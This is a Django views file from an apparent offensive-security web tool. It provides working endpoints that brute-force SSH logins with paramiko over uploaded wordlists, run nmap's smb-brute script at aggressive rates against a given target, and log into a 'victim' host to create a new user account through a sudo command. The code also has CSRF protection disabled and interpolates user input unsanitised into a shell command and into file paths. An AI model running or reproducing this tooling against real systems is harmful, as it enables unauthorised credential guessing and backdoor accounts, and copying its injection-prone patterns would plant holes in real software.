from django.shortcuts import render
from django.http import JsonResponse, HttpResponse, StreamingHttpResponse
from .models import ExploitationTool
from django.contrib.auth.decorators import login_required
from yellow_hat.constants import NMAP_SMB_BRUTE, PARAMIKO_SSH_BRUTE
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST
from django.conf import settings
import time
import subprocess
import paramiko
import os


# Create your views here.
def index(request):
    return render(request, "exploitation/index.html")


@csrf_exempt
@require_POST
@login_required
def paramiko_test_create_account(request):
    if request.method == "POST":
        try:
            # Get form data from the request
            victim_ip = request.POST.get("victim-ip")
            victim_username = request.POST.get("victim-username")
            victim_password = request.POST.get("victim-password")
            new_username = request.POST.get("new-username")
            new_password = request.POST.get("new-password")

            # Create SSH client and establish connection
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(
                victim_ip,
                username=victim_username,
                password=victim_password,
                timeout=10,
            )

            print(f"SSH client established: {ssh_client}")

            # Test command: 'ls -l' to check if the connection is working
            test_command = "ls -l"

            # Run the command and get stdout, stderr, and stdin
            stdin, stdout, stderr = ssh_client.exec_command(test_command)

            # Read stdout and stderr in real-time
            output = ""
            while True:
                if stdout.channel.recv_ready():
                    output += stdout.channel.recv(1024).decode("utf-8")
                    print(output)  # Print real-time output to console or log

                if stderr.channel.recv_ready():
                    error_output = stderr.channel.recv(1024).decode("utf-8")
                    print(f"Error: {error_output}")  # Print error output if any

                if stdout.channel.exit_status_ready():
                    break
                time.sleep(0.1)  # Sleep to avoid high CPU usage

            # Check the exit status of the command
            exit_status = stdout.channel.recv_exit_status()

            # If the test command was successful
            if exit_status == 0:
                print("go here mean the connection was established")

                # Command to create a new user (use actual password encryption or other secure ways)
                create_user_command = f"sudo useradd -m -p $(openssl passwd -1 {new_password}) {new_username}"

                # Open an SSH session and send the sudo password automatically
                stdin, stdout, stderr = ssh_client.exec_command(create_user_command)

                # Handle the sudo password prompt
                stdin.write(
                    victim_password + "\n"
                )  # Automatically input the sudo password
                stdin.flush()

                # Real-time output for the user creation command
                user_creation_output = ""
                while True:
                    if stdout.channel.recv_ready():
                        user_creation_output += stdout.channel.recv(1024).decode(
                            "utf-8"
                        )
                        print(user_creation_output)

                    if stderr.channel.recv_ready():
                        error_output = stderr.channel.recv(1024).decode("utf-8")
                        print(f"Error: {error_output}")

                    if stdout.channel.exit_status_ready():
                        break
                    time.sleep(0.1)

                # Check if user creation was successful
                exit_status = stdout.channel.recv_exit_status()
                if exit_status == 0:
                    response = {
                        "success": True,
                        "message": "Account created successfully!",
                    }
                else:
                    response = {
                        "success": False,
                        "error": f"Failed to create account. Output: {user_creation_output}",
                    }

            else:
                response = {
                    "success": False,
                    "error": "SSH connection or test command failed.",
                }

        except Exception as e:
            response = {"success": False, "error": f"An error occurred: {str(e)}"}

        finally:
            ssh_client.close()

        # Return response as JSON
        return JsonResponse(response)

    return JsonResponse(
        {"success": False, "error": "Invalid request method."}, status=400
    )


@login_required
def exploitation_tools(request, exploitation_tool_slug):
    exploitation_tool = ExploitationTool.objects.get(slug=exploitation_tool_slug)
    exploitation_tool_name = exploitation_tool.name.strip().lower()
    print(f"exploitation_tool_name is {exploitation_tool_name}")
    if request.method == "GET":
        if exploitation_tool_name in NMAP_SMB_BRUTE:
            return render(
                request,
                "exploitation/nmap-smb-brute.html",
                {
                    "exploitation_tool": exploitation_tool,
                    "exploitation_tool_name": exploitation_tool_name,
                },
            )
        elif exploitation_tool_name in PARAMIKO_SSH_BRUTE:
            return render(
                request,
                "exploitation/paramiko-ssh-brute.html",
                {
                    "exploitation_tool": exploitation_tool,
                    "exploitation_tool_name": exploitation_tool_name,
                },
            )
    elif request.method == "POST":
        # set default values for error and response data
        error_message = None
        response_data = None

        if exploitation_tool_name in NMAP_SMB_BRUTE:
            target_domain = request.POST.get("domain").strip().lower()

            if not target_domain:
                error_message = str("IP address is required")
                response_data = {
                    "error_message": error_message,
                }
                return JsonResponse(response_data, status=400)
        if exploitation_tool_name in PARAMIKO_SSH_BRUTE:
            print("go here mean choose paramiko ssh brute force")
            target_ip = request.POST.get("target_ip", "").strip()
            username_list = request.FILES.get("username_list")
            password_list = request.FILES.get("password_list")

            if not target_ip or not username_list or not password_list:
                error_message = (
                    "Target IP, username list, and password list are required"
                )
                response_data = {
                    "error_message": error_message,
                }
                return JsonResponse(response_data, status=400)

            # Now, save the files to temporary storage
            try:
                # Save the uploaded username and password files to the BRUTE_FORCE_DIRECTORY
                username_file_path = os.path.join(
                    settings.BRUTE_FORCE_DIRECTORY, f"temp_usernames_{target_ip}.txt"
                )
                password_file_path = os.path.join(
                    settings.BRUTE_FORCE_DIRECTORY, f"temp_passwords_{target_ip}.txt"
                )

                # Ensure files are saved in the correct directory
                with open(username_file_path, "wb") as f:
                    for chunk in username_list.chunks():
                        f.write(chunk)

                with open(password_file_path, "wb") as f:
                    for chunk in password_list.chunks():
                        f.write(chunk)

                # You can now process these files or store their paths as needed
                print(f"Usernames saved to {username_file_path}")
                print(f"Passwords saved to {password_file_path}")
            except Exception as e:
                error_message = f"An error occurred while saving files: {str(e)}"
                response_data = {
                    "error_message": error_message,
                }
                return JsonResponse(response_data, status=500)

        # Here you might start a background task to run the scan and save the results
        # For simplicity, we'll assume that the scan is started immediately and streamed

        # Save the target domain or other data as needed
        return JsonResponse({"message": "Attack Started"})


def brute_force_ssh(target_ip, username_list, password_list):
    print("Go to function brute_force_ssh")
    """
    Perform SSH brute-force with Paramiko and stream results.
    """
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in username_list:
        for password in password_list:
            retries = 3  # Set retries to a maximum of 3 attempts per username/password combination
            while retries > 0:
                try:
                    # Try SSH connection
                    ssh_client.connect(
                        target_ip,
                        username=username,
                        password=password,
                        timeout=10,  # Connection timeout in seconds
                        banner_timeout=15,  # SSH banner timeout (increase if necessary)
                    )
                    yield f"data: Success! Found valid credentials: {username}:{password}\n\n"
                    ssh_client.close()
                    return  # Exit after finding valid credentials

                except paramiko.AuthenticationException:
                    yield f"data: Failed attempt: {username}:{password}\n\n"
                    break  # Move to the next password after failure

                except paramiko.SSHException as e:
                    retries -= 1
                    yield f"data: SSH error: {str(e)}. Retrying... ({3 - retries} attempts left)\n\n"
                    time.sleep(2)  # Wait before retrying (increase delay if needed)
                    continue  # Retry the connection

                except Exception as e:
                    yield f"data: Error: {str(e)}\n\n"
                    break  # Exit if there is a different error

            time.sleep(
                2
            )  # Adding a delay before trying the next username/password pair

    yield "data: No valid credentials found.\n\n"


@csrf_exempt
@login_required
def paramiko_ssh_brute_force_stream(request, exploitation_tool_slug):
    print("Go to this function paramiko_ssh_brute_force_stream")

    # Get target IP from the POST request
    target_ip = request.GET.get("target_ip", "").strip()
    print(f"target_ip is: {target_ip}")

    # Get the stored file paths from the BRUTE_FORCE_DIRECTORY based on the target IP
    username_file_path = os.path.join(
        settings.BRUTE_FORCE_DIRECTORY, f"temp_usernames_{target_ip}.txt"
    )
    password_file_path = os.path.join(
        settings.BRUTE_FORCE_DIRECTORY, f"temp_passwords_{target_ip}.txt"
    )

    print(f"User File path: {username_file_path}")
    print(f"Pass File path: {password_file_path}")

    if (
        not target_ip
        or not os.path.exists(username_file_path)
        or not os.path.exists(password_file_path)
    ):
        print("go here mean error: no credentials")
        error_message = str(
            "Target IP, username list, and password list are required or files not found."
        )
        response_data = {
            "error_message": error_message,
        }
        return JsonResponse(response_data, status=400)

    # Read the username and password lists from the saved files
    try:
        with open(username_file_path, "r") as username_file:
            username_list = username_file.read().splitlines()

        with open(password_file_path, "r") as password_file:
            password_list = password_file.read().splitlines()

        # Optionally, you can delete the temporary files after reading
        os.remove(username_file_path)
        os.remove(password_file_path)

        print("Temporary files processed successfully.")
    except Exception as e:
        print("go here mean error when open file")
        error_message = f"An error occurred while processing the files: {str(e)}"
        response_data = {
            "error_message": error_message,
        }
        return JsonResponse(response_data, status=500)

    response = HttpResponse(
        brute_force_ssh(target_ip, username_list, password_list),
        content_type="text/event-stream",
    )
    response["Cache-Control"] = "no-cache"
    return response


@login_required
def exploitation_tools_stream(request, exploitation_tool_slug):
    target_domain = request.GET.get("domain").strip().lower()

    if not target_domain:
        return HttpResponse("IP address is required", status=400)

    # Define the Nmap command for SMB brute force with verbose output
    nmap_command = [
        "nmap",
        "-p",
        "445",
        "--script",
        "smb-brute",
        target_domain,
        "-T4",
        "--min-parallelism",
        "100",
        "--max-retries",
        "1",
        "--max-rate",
        "500",
        "--min-rate",
        "100",
        "-vvvv",
    ]

    def stream_output():
        with subprocess.Popen(
            nmap_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
        ) as process:
            try:
                while True:
                    output = process.stdout.readline()
                    print(f"go here to print output {output}")
                    if output == "" and process.poll() is not None:
                        break
                    if output:
                        yield f"data: {output}\n\n"
                    time.sleep(0.1)  # to prevent tight loop and high CPU usage
            except Exception as e:
                yield f"data: Error occurred while streaming Nmap output: {str(e)}\n\n"

    response = HttpResponse(stream_output(), content_type="text/event-stream")
    response["Cache-Control"] = "no-cache"
    return response
